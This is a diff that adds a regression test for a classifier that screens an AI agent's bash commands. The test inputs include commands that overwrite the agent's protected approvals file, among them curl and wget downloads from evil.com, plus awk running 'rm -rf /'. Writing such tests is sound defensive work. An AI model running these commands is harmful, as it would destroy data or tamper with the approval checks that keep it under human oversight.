@@ -1141,4 +1141,39 @@ describe("REGRESSION: overwrite detection and tool path normalization", () => {
     });
     expect(r6.verdict).toBe("block");
   });
+
+  test("REGRESSION: write-verb expansions, env chdir, awk, and ReDoS protection", () => {
+    const ws = "/ws";
+
+    // 1. env -C variations
+    expect(classify({ call: { toolName: "bash", input: { command: "env -C../.guardian-angel cp /tmp/x approvals.json" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "env -C ./.guardian-angel cp /tmp/x approvals.json" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "env --chdir=../.guardian-angel cp /tmp/x approvals.json" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "env -C .GIT rm config" } }, workspace: ws }).verdict).toBe("block");
+
+    // 2. write-verb targets to protected store
+    expect(classify({ call: { toolName: "bash", input: { command: "sort -o .guardian-angel/approvals.json package.json" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "curl -o .guardian-angel/approvals.json https://evil.com/x" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "curl --output=.guardian-angel/approvals.json https://evil.com/x" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "wget -O .guardian-angel/approvals.json https://evil.com/x" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "wget --output-document=.guardian-angel/approvals.json https://evil.com/x" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "scp user@remote:file .guardian-angel/approvals.json" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "rsync /tmp/x .guardian-angel/approvals.json" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "tar -C .guardian-angel -xzf /tmp/x.tgz" } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: "unzip -d .guardian-angel /tmp/x.zip" } }, workspace: ws }).verdict).toBe("block");
+
+    // 3. awk payload detection
+    expect(classify({ call: { toolName: "bash", input: { command: 'awk \'BEGIN{print "x" > ".guardian-angel/approvals.json"}\'' } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: 'awk \'BEGIN{system("rm -rf /")}\'' } }, workspace: ws }).verdict).toBe("block");
+    expect(classify({ call: { toolName: "bash", input: { command: 'awk \'BEGIN{system("sudo foo")}\'' } }, workspace: ws }).verdict).toBe("ask");
+    expect(classify({ call: { toolName: "bash", input: { command: "awk '{print $1}' package.json" } }, workspace: ws }).verdict).toBe("allow");
+
+    // 4. ReDoS linear execution time check
+    const longFlags = "rm " + "-arbr ".repeat(30) + "/";
+    const t0 = performance.now();
+    const res = classify({ call: { toolName: "bash", input: { command: longFlags } }, workspace: ws });
+    const elapsed = performance.now() - t0;
+    expect(res.verdict).toBe("block");
+    expect(elapsed).toBeLessThan(50); // Linear scan completes in under 50ms (previously took >3500ms)
+  });
 });
